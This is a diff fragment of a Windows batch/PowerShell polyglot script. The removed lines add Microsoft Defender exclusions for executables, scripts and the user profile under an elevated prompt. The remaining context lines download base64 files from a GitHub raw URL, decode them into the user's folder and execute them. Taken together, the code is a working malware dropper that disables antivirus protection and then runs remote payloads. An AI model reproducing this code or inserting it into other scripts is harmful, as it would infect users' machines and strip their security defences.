@@ -1,19 +1,3 @@
-<# :batch script
-Echo Please wait...
-@echo off
-setlocal
-cd "%~dp0"
-powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
-endlocal
-goto:eof
-#>
-while($true) {
-    try {
-        # Step 1: Set exclusions with admin privileges
-        $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
-        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'"
-        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait
-
         # Step 2: Download, decode, and execute the first file
         $url1 = 'https://raw.githubusercontent.com/pyrequests/Release/refs/heads/main/tg.txt'
         $encodedFilePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'tg.txt')
@@ -30,9 +14,3 @@ while($true) {
         [System.IO.File]::WriteAllBytes($decodedFilePath2, [Convert]::FromBase64String((Get-Content $encodedFilePath2)))
         Start-Process -FilePath $decodedFilePath2
 
-        # Exit the loop after successful execution
-        exit
-    } catch {
-        # Optional: Add logging or handling here if needed
-    }
-}
